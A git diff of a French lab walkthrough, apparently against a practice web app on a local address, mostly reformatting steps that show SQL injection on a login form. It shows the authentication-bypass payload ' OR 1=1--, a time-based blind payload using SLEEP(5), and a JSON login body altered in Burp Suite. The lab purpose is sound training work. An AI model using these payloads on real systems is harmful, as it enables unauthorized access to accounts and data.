@@ -97,17 +97,17 @@ URL de connexion : `http://192.168.100.10:3000`
 
  Étape 4 - Injection SQL simple  
 
-Champ	Valeur   
-Email	' OR 1=1--   
-Password	n'importe quoi   
+Champ et Valeur     
+Email	' OR 1=1--     
+Password	n'importe quoi     
 
-✅ Connexion réussie sans mot de passe grâce à une injection SQL simple.
+✅ Connexion réussie sans mot de passe grâce à une injection SQL simple.   
 
 ---
 
- Étape 5 - Injection SQL avancée (Blind SQLi)   
+ Étape 5 - Injection SQL avancée (Blind SQLi)      
 
-Champ	Valeur   
+Champ et Valeur   
 Email	' OR IF(1=1, SLEEP(5), 0)--   
 Password	test   
 
@@ -117,14 +117,14 @@ Password	test
 
 Attaque via Burp Suite
 
-⚙️ Détails techniques :  
-	•	Interception de la requête POST /rest/user/login   
-	•	Modification manuelle du corps JSON :   
+⚙️ Détails techniques :    
+	•	Interception de la requête POST /rest/user/login      
+	•	Modification manuelle du corps JSON :      
 
-{   
-  "email": "' OR 1=1--",   
-  "password": "peuimporte"   
-}   
+{     
+  "email": "' OR 1=1--",     
+  "password": "test"     
+}      
 
 ---
 
